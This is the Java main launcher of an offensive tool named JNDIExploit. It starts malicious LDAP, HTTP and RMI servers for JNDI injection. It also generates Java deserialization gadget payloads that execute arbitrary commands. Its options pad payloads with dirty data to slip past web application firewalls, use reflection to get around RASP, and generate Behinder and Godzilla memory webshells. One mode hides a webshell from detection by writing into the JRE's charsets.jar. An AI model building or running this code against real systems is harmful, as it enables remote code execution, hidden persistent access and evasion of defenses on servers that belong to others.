package com.qi4l.jndi;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.ObjectPayload;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Serializer;
import com.qi4l.jndi.gadgets.utils.Strings;
import com.qi4l.jndi.gadgets.utils.dirty.DirtyDataWrapper;
import org.apache.commons.cli.*;


import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.*;

import static com.qi4l.jndi.gadgets.utils.HexUtils.generatePassword;
import static com.qi4l.jndi.gadgets.utils.Strings.isFromExploit;

public class Starter {

    public static CommandLine cmdLine;

    private       PayloadType payloadType;

    public static Object      PAYLOAD = null;

    public static void main(String[] args) throws Exception {
        if (args.length > 0 && args[0].equals("--jndi")) {
            Config.applyCmdArgs(args);
            LdapServer.start();
            HTTPServer.start();
            RMIServer.start();
        }
        if (args.length > 0 && args[0].equals("-yso")) {
            Options options = new Options();
            options.addOption("yso", "ysoserial", true, "Java deserialization");
            options.addOption("g", "gadget", true, "Java deserialization gadget");
            options.addOption("p", "parameters", true, "Gadget parameters");
            options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
            options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
            options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
            options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
            options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
            options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
            options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
            options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
            options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
            options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://nu1r.cn/]");
            options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
            options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
            options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
            options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
            options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
            options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
            options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
            options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
            options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");

            CommandLineParser parser = new DefaultParser();

            if (args.length == 0) {
                printUsage(options);
                System.exit(1);
            }

            try {
                cmdLine = parser.parse(options, args);
            } catch (Exception e) {
                System.out.println("[*] Parameter input error, please use -h for more information");
                printUsage(options);
                System.exit(1);
            }

            if (cmdLine.hasOption("inherit")) {
                Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
            }

            if (cmdLine.hasOption("obscure")) {
                Config.IS_OBSCURE = true;
            }

            if (cmdLine.hasOption("cmd-header")) {
                Config.CMD_HEADER_STRING = cmdLine.getOptionValue("cmd-header");
            }

            if (cmdLine.hasOption("url")) {
                String url = cmdLine.getOptionValue("url");
                if (!url.startsWith("/")) {
                    url = "/" + url;
                }
                Config.URL_PATTERN = url;
            }

            if (cmdLine.hasOption("define-class-from-parameter")) {
                Config.PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
            }

            if (cmdLine.hasOption("file")) {
                Config.WRITE_FILE = true;
                Config.FILE = cmdLine.getOptionValue("file");
            }

            if (cmdLine.hasOption("password")) {
                Config.PASSWORD_ORI = cmdLine.getOptionValue("password");
                Config.PASSWORD = generatePassword(Config.PASSWORD_ORI);
            }

            if (cmdLine.hasOption("godzilla-key")) {
                Config.GODZILLA_KEY = generatePassword(cmdLine.getOptionValue("godzilla-key"));
            }

            if (cmdLine.hasOption("header-key")) {
                Config.HEADER_KEY = cmdLine.getOptionValue("header-key");
            }

            if (cmdLine.hasOption("header-value")) {
                Config.HEADER_VALUE = cmdLine.getOptionValue("header-value");
            }

            if (cmdLine.hasOption("no-com-sun")) {
                Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
            }

            if (cmdLine.hasOption("mozilla-class-loader")) {
                Config.USING_MOZILLA_DEFININGCLASSLOADER = true;
            }

            if (cmdLine.hasOption("rhino")) {
                Config.USING_RHINO = true;
            }

            if (cmdLine.hasOption("gen-mem-shell")) {
                Config.GEN_MEM_SHELL = true;

                if (cmdLine.hasOption("gen-mem-shell-name")) {
                    Config.GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
                }
            }

            if (cmdLine.hasOption("hide-mem-shell")) {
                Config.HIDE_MEMORY_SHELL = true;

                if (cmdLine.hasOption("hide-type")) {
                    Config.HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
                }
            }

            final String payloadType = cmdLine.getOptionValue("gadget");
            final String command     = cmdLine.getOptionValue("parameters");

            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
            if (payloadClass == null) {
                System.err.println("Invalid payload type '" + payloadType + "'");
                printUsage(options);
                System.exit(1);
                return;
            }


            try {
                ObjectPayload payload = payloadClass.newInstance();
                Object        object  = payload.getObject(PayloadType.command, command);

                // 是否指定混淆
                if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
                    int type   = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
                    int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
                    object = new DirtyDataWrapper(object, type, length).doWrap();
                }

                // 储存生成的 payload
                PAYLOAD = object;
                if (isFromExploit()) {
                    return;
                }

                OutputStream out;

                if (Config.WRITE_FILE) {
                    out = new FileOutputStream(Config.FILE);
                } else {
                    out = System.out;
                }
                Serializer.qiserialize(object, out);
                ObjectPayload.Utils.releasePayload(payload, object);

                out.flush();
                out.close();
            } catch (Throwable e) {
                System.err.println("Error while generating or serializing payload");
                e.printStackTrace();
                System.exit(1);
            }
            System.exit(0);
        }
    }

    private static void printUsage(Options options) {

        System.err.println("[root]#~  Usage: java -jar JNDIExploit-[version].jar -yso -g [payload] -p [command] [options]");
        System.err.println("[root]#~  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
                new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }

        System.err.println("\r\n");
        HelpFormatter helpFormatter = new HelpFormatter();
        helpFormatter.setWidth(Math.min(200, jline.Terminal.getTerminal().getTerminalWidth()));
        helpFormatter.printHelp("JNDIExploit-[version].jar", options, true);

        System.err.println("\r\n");
        System.err.println("Recommended Usage: -yso -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
        System.err.println("If you want your payload being extremely short，you could just use:");
        System.err.println("java -jar JNDIExploit-[version].jar -yso -g [payload] -p '[command]' -i -f evil.ser");
        System.exit(0);
    }
}
